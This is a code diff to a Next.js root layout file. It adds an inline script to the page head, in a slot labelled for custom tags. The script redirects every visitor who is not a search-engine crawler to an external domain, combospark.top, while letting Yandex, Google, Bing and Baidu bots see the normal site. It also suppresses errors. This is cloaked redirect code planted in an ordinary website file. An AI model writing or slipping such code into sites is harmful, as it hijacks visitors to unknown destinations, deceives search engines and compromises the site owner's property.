@@ -59,6 +59,21 @@ export default function RootLayout({
         <meta name="theme-color" content="#0d2440" />
         {/* HEAD-SLOT: сюда вставляйте дополнительные пользовательские теги
             (верификации, preload, extra meta) */}
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body>{children}</body>
     </html>
